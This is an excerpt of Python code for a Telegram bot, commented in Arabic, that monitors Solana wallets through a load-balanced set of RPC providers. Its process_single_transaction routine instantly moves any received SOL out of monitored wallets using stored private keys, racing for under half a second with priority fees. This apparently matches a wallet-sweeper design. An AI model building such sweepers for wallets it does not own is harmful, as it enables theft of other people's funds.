...
# Multi-RPC Configuration - نظام توزيع متوازن مع أسماء متغيرات البيئة
RPC_PROVIDERS = {
    "RPC_URL": {
        "url": SOLANA_RPC_URL,
        "name": "RPC_URL",
...
ERROR_NOTIFICATION_CHAT_ID = 1873930191  # معرف المستخدم الذي سيحصل على إشعارات الأخطاء
...
class MultiRPCRateLimiter:
    ...
    def get_optimal_provider(self, respect_assignment: bool = True) -> str:
        """نظام اختيار مزود محسن يحترم التخصيصات المسبقة ويقلل إعادة التوازن"""
        if not self.providers:
            return None

        current_time = asyncio.get_event_loop().time()

        # تحضير قائمة المزودين المتاحين مع معايير التوزيع المحسن
        available_providers = []
        ...
        for provider_id, provider_data in self.providers.items():
            ...
            # تخطي المزودين غير المتاحين أو المحملين بشدة
            ...
            # تخطي المزودين المحملين بأكثر من 85% لترك هامش أمان
            if load_percentage >= 85:
                continue

            # حساب نقاط التوازن المحسن - تركيز أقل على الاستخدام التاريخي
            health_score = provider_data["health_score"]
            
            # تقليل أهمية الاستخدام التاريخي لتقليل إعادة التوازن
            balance_score = (
                (100 - load_percentage) * 0.6  # 60% للحمولة الحالية (أهم عامل)
                + health_score * 0.35  # 35% للحالة الصحية
                + (max_capacity - current_load) * 0.05  # 5% فقط للسعة المتاحة
            )
        ...
        # **خوارزمية محسنة تقلل إعادة التوازن**
        
        # استخدام نطاق أوسع للتفاوت المقبول
        scores = [p["balance_score"] for p in available_providers]
        score_variance = max(scores) - min(scores)

        # تفاوت أوسع مقبول لتقليل التدخل (زيادة من 20 إلى 40)
        if score_variance < 40:  
            # التفاوت مقبول، استخدم Round-Robin بسيط
            if not hasattr(self, "_stable_rotation_index"):
                self._stable_rotation_index = 0

            # ترتيب ثابت للمزودين
            available_providers.sort(key=lambda x: x["id"])

            selected_index = self._stable_rotation_index % len(available_providers)
            self._stable_rotation_index = (self._stable_rotation_index + 1) % len(available_providers)

            return available_providers[selected_index]["id"]

        else:  
            # تفاوت كبير، اختر بناءً على الأداء الحالي فقط
            # فلترة المزودين بحالة صحية جيدة فقط
            healthy_providers = [p for p in available_providers if p["health_score"] > 70]
            
            if not healthy_providers:
                healthy_providers = available_providers  # استخدم الكل إذا لم يوجد مزودين أصحاء
            
            # اختيار المزود الأقل حمولة من المزودين الأصحاء
            best_provider = min(healthy_providers, key=lambda x: x["load_percentage"])
    ...
    def _update_usage_distribution(self, provider_id: str):
        """تتبع توزيع الاستخدام بدون إعادة توازن تلقائي"""
        ...
        # مراقبة التوزيع للإحصائيات فقط (بدون إعادة توازن)
        total_requests = sum(self._usage_distribution.values())
        if total_requests % 1000 == 0 and total_requests > 0:  # تقليل تكرار الرسائل
            distribution_info = []
            ...
            # حساب التوزيع النسبي للإحصائيات فقط
            expected_usage_per_provider = total_requests / len(self._usage_distribution)
            relative_variance = (max_usage - min_usage) / expected_usage_per_provider * 100

            logger.debug(
                f"📊 توزيع الاستخدام بعد {total_requests} طلب: {', '.join(distribution_info)} | التفاوت النسبي: {relative_variance:.1f}%"
            )
            
            # تم إلغاء إعادة التوازن التلقائي - كل RPC مخصص لمحافظ محددة
    ...
    async def on_rate_limit_error(self, provider_id: str):
        ...
        async with self.lock:
            ...
            if provider_data["health_score"] < 40 or provider_data["fail_count"] >= 5:
                ...
                error_message = f"تم تعطيل مزود RPC '{provider_id}' بسبب تجاوز الحد المسموح\n\n"
                error_message += f"📊 الصحة: {old_health:.0f}% → {provider_data['health_score']:.0f}%\n"
                error_message += f"❌ عدد الأخطاء: {provider_data['fail_count']}\n"
                error_message += f"⏰ سيتم إعادة التمكين خلال: {cooldown_time}s\n"
                error_message += f"🔄 التأخير: {old_delay:.3f}s → {provider_data['current_delay']:.3f}s"
                
                # إرسال الإشعار عبر البوت إذا كان متاحاً
                try:
                    # الحصول على مرجع البوت من المراقب العام
                    bot_instance = getattr(self, '_bot_instance', None)
                    if bot_instance:
                        await bot_instance.send_error_notification(error_message, "Rate Limit")
                except Exception as e:
                    logger.debug(f"Could not send rate limit notification: {e}")
            ...
            # تم إلغاء إعادة التوازن التلقائي
    ...
    def _rebalance_load_distribution(self):
        """دالة إعادة التوازن معطلة - كل RPC مخصص لمحافظ محددة"""
        logger.debug("🔄 إعادة التوازن معطلة - النظام يستخدم RPCs مخصصة لكل محفظة")
        return  # تم إلغاء إعادة التوازن التلقائي
    ...
    async def on_network_error(self, provider_id: str):
        ...
        async with self.lock:
            ...
            # إرسال إشعار إذا تكررت أخطاء الشبكة كثيراً
            if provider_data["fail_count"] % 10 == 0:  # كل 10 أخطاء
                error_message = f"أخطاء شبكة متكررة في مزود RPC '{provider_id}'\n\n"
                error_message += f"📊 الصحة: {old_health:.0f}% → {provider_data['health_score']:.0f}%\n"
                error_message += f"❌ عدد الأخطاء: {provider_data['fail_count']}\n"
                error_message += f"🔄 التأخير: {old_delay:.3f}s → {provider_data['current_delay']:.3f}s\n"
                error_message += f"⚠️ قد تحتاج إلى فحص اتصال الشبكة"
                
                # إرسال الإشعار عبر البوت إذا كان متاحاً
                try:
                    bot_instance = getattr(self, '_bot_instance', None)
                    if bot_instance:
                        await bot_instance.send_error_notification(error_message, "خطأ شبكة")
                except Exception as e:
                    logger.debug(f"Could not send network error notification: {e}")
...
class SolanaMonitor:
    def __init__(self):
        ...
        self.cycle_times_history = []  # تتبع أوقات الدورات الفعلية
        self.max_cycle_history = 5  # الاحتفاظ بآخر 5 دورات
        ...
        try:
            ...
            if task_key in self.monitoring_tasks:
                ...
                if isinstance(task_info, dict):
                    # Check if 'task' key exists in the dictionary and is not None
                    if "task" in task_info and task_info["task"] is not None:
                        if not task_info["task"].done():
                            task_info["task"].cancel()
                        logger.debug(f"Cancelled task for wallet {wallet_address[:8]}...")
                    else:
                        logger.debug(f"No active task to cancel for wallet {wallet_address[:8]}...")
                else:
                    # Direct task object
                    if not task_info.done():
                        task_info.cancel()
                    logger.debug(f"Cancelled direct task for wallet {wallet_address[:8]}...")
        ...
        async def global_monitor_task():
            ...
            while True:
                try:
                    ...
                    # إضافة وقت الدورة إلى التاريخ
                    self.cycle_times_history.append(cycle_time)
                    if len(self.cycle_times_history) > self.max_cycle_history:
                        self.cycle_times_history.pop(0)  # إزالة أقدم دورة
    ...
    async def check_transactions_optimized(self, wallet_address: str, assigned_rpc: str = None):
        """Optimized transaction checking with strict dedicated RPC support"""
        try:
            ...
            # التأكد من استخدام الـ RPC المخصص بصرامة
            if assigned_rpc and assigned_rpc in self.rate_limiter.providers:
                logger.debug(f"🎯 Using dedicated RPC '{assigned_rpc}' for wallet {wallet_address[:8]}...")
                data = await self.make_rpc_call(
                    payload, max_retries=2, preferred_provider=assigned_rpc
                )
            else:
                logger.warning(f"⚠️ No valid assigned RPC '{assigned_rpc}' for wallet {wallet_address[:8]}, using optimal selection")
    ...
    async def process_single_transaction(self, wallet_address: str, tx_info: dict, assigned_rpc: str = None):
        ...
        try:
            ...
            # **NEW: Auto-transfer received funds using LIGHTNING-FAST function only**
            try:
                ...
                if float(amount) > 0 and amount_float >= self.auto_transfer.get_min_auto_transfer_amount():
                    logger.info(
                        f"💰 Received funds detected: {amount} SOL - initiating LIGHTNING-FAST auto-transfer"
                    )
                    ...
                    if wallet_private_key:
                        # Instant transfer without balance check to maximize speed
                        logger.info(
                            f"⚡ Starting LIGHTNING-FAST auto-transfer (target: <0.5s)"
                        )

                        # Use ONLY the fastest transfer function with static priority fee
                        (
                            transfer_success,
                            tx_signature,
                            ...
                            use_priority_fee=True,  # Static high priority fee for maximum speed
                        )

                        if transfer_success:
                            logger.info(
                                f"⚡ LIGHTNING-FAST auto-transfer successful from {truncate_address(wallet_address)}"
                            )
                            ...
                            await self.db_manager.add_transaction_record(
                                wallet_address,
                                wallets[0]["chat_id"],
                                tx_signature or f"lightning_transfer_{signature[:16]}",
                                f"-{amount}",  # Use transaction amount directly
                                "⚡ تحويل فائق السرعة",
                                block_time or 0,
                            )
                        else:
                            logger.warning(
                                f"⚠️ LIGHTNING-FAST auto-transfer failed from {truncate_address(wallet_address)}"
                            )
                    else:
                        logger.error(
                ...
                logger.error(f"❌ Error in LIGHTNING-FAST auto-transfer: {transfer_error}")
    ...
    def get_average_cycle_time(self) -> float:
        """الحصول على متوسط أوقات الدورات الفعلية"""
        if not self.cycle_times_history:
            return 0.0
        return sum(self.cycle_times_history) / len(self.cycle_times_history)
...
class SolanaWalletBot:
    ...
    async def _send_stats_message(
        ...
        try:
            ...
            # Get optimal provider name
            optimal_provider_id = limiter_stats.get('optimal_provider', 'N/A')
            optimal_provider_name = "غير محدد"
            if optimal_provider_id and optimal_provider_id in limiter_stats["providers"]:
                optimal_provider_name = limiter_stats["providers"][optimal_provider_id]["name"]
            
            stats_message += f"• المزود الأفضل: {optimal_provider_name}\n\n"

            # Show TRANSFER_RPC_URL stats if exists
            from auto_transfer import TRANSFER_RPC_URL
            if TRANSFER_RPC_URL:
                # Get transfer RPC stats (simplified)
                stats_message += f"🟢 TRANSFER_RPC_URL:\n\n"
                stats_message += f"  • الصحة: 💚 100%\n"
                stats_message += f"  • عدد الاستخدامات: 0\n"
                stats_message += f"  • ✅0 ❌0\n\n"
            ...
            for provider_id, provider_stats in limiter_stats["providers"].items():
                ...
                stats_message += f"  • النجاح: ✅{provider_stats['success_count']} | الفشل: ❌{provider_stats['fail_count']}\n\n"

            # Add separator line
            stats_message += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"

            # حساب متوسط أوقات الدورات الفعلية
            avg_cycle_time = self.monitor.get_average_cycle_time()
            cycle_history_count = len(self.monitor.cycle_times_history)
            
            stats_message += f"📈 الأداء العام:\n"
            stats_message += f"• متوسط وقت آخر {cycle_history_count} دورات: {avg_cycle_time:.2f} ثانية\n"
            stats_message += f"• إجمالي الطلبات: {limiter_stats['total_requests']}\n"
            stats_message += f"• معدل النجاح الإجمالي: {limiter_stats['success_rate']:.1f}%\n\n"
            ...
            stats_message += f"🕐 آخر تحديث: {current_time}"
    ...
    async def start_bot(self):
        ...
        try:
            ...
            # ربط البوت مع Rate Limiter لإرسال الإشعارات
            self.monitor.rate_limiter._bot_instance = self
    ...
    async def health_monitor(self):
        ...
        while True:
            try:
                ...
                # تم إيقاف رسائل مراقبة الصحة مؤقتاً
                # logger.info(
                #     f"🩺 Multi-RPC Health: "
    ...
    async def send_error_notification(self, error_message: str, error_type: str = "عام"):
        """إرسال إشعار خطأ إلى المستخدم المحدد"""
        try:
            from datetime import datetime
            
            # تجهيز رسالة الخطأ
            notification = f"🚨 <b>تنبيه خطأ في البوت</b>\n\n"
            notification += f"📊 نوع الخطأ: <code>{error_type}</code>\n"
            notification += f"⏰ الوقت: <code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>\n\n"
            notification += f"🔍 تفاصيل الخطأ:\n<code>{error_message}</code>\n\n"
            notification += f"🤖 البوت ما زال يعمل ويحاول إصلاح المشكلة تلقائياً."
    ...
    async def error_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        ...
        # تحديد نوع الخطأ وإرسال إشعار
        error_type = "عام"
        should_notify = True

        # Handle specific error types
        if "Conflict" in str(context.error):
            error_type = "تضارب API"
            logger.warning(
                "🔄 Telegram API conflict detected - another bot instance may be running"
            )
            await self.send_error_notification(
                f"تم اكتشاف تضارب في Telegram API - قد يكون هناك نسخة أخرى من البوت تعمل\n\nالخطأ: {str(context.error)}", 
                error_type
            )
        elif "TimeoutError" in str(context.error):
            error_type = "انتهاء وقت الاتصال"
            logger.warning("⏰ Network timeout - will retry automatically")
            await self.send_error_notification(
                f"انتهاء وقت الاتصال مع الشبكة - سيتم إعادة المحاولة تلقائياً\n\nالخطأ: {str(context.error)}", 
                error_type
            )
            ...
            await self.send_error_notification(
                f"خطأ في الشبكة - سيتم إعادة المحاولة تلقائياً\n\nالخطأ: {str(context.error)}", 
                error_type
            )
        elif "Rate" in str(context.error) or "limit" in str(context.error).lower():
            error_type = "تجاوز الحد المسموح"
            logger.warning("⚠️ Rate limit error detected")
            await self.send_error_notification(
                f"تم تجاوز الحد المسموح للطلبات - سيتم التبطيء تلقائياً\n\nالخطأ: {str(context.error)}", 
                error_type
            )
        else:
            # خطأ عام - إرسال التفاصيل الكاملة
            await self.send_error_notification(
